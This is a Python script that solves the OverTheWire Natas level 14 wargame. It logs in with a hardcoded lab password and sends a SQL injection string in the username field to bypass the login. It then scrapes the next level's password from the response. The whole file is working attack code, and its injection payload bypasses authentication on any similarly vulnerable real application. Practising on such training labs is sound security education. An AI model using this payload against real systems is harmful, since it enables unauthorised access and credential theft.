#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.session()
response = session.post(url, auth = (username, password), data = {"username" : '" OR "1"="1"#'})
content = response.text

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('natas15 is (.*)<br>', content)[0])